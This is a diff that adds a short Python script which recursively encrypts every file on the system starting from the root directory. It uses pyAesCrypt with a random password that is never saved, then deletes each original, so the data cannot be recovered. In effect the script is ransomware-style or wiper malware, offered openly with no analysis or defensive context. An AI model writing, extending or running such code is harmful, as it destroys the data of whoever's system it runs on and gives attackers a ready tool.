@@ -1,0 +1,35 @@
+#!/bin/python3
+import os 
+import pyAesCrypt
+import colorama
+from colorama import Fore,Back,Style
+colorama.init()
+import random
+from os import sys
+bufferSize = 900*1024
+def generate_password():
+ pas=""
+ sym=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y''z','1','2','3','4','5','6','7','8','9','0','!','@','#']
+ for i in range(0,20):
+  pas+=random.choice(sym)
+ #print(Fore.GREEN+"Password was generated!"+Fore.RESET+"({})".format(pas))
+ return pas
+def main():
+ i=input("Press any key to encrypt all system...")
+ find('/')
+ print(Fore.GREEN+"All your files in {} directory were encrypted".format(dir)+Fore.RESET)
+def find(dir):
+ for name in os.listdir(dir):
+  if os.path.isfile(os.path.join(dir,name)):
+   try:
+    print (Fore.GREEN+'Encrypting file:'+Fore.RESET+os.path.join(dir,name))
+    crypt(os.path.join(dir,name))
+   except:
+    pass 
+  else :
+   if os.path.isdir(os.path.join(dir,name)):
+    find(os.path.join(dir,name))
+def crypt(path):
+ pyAesCrypt.encryptFile(path,path+".crp",generate_password(),bufferSize)
+ os.remove(path)
+main()
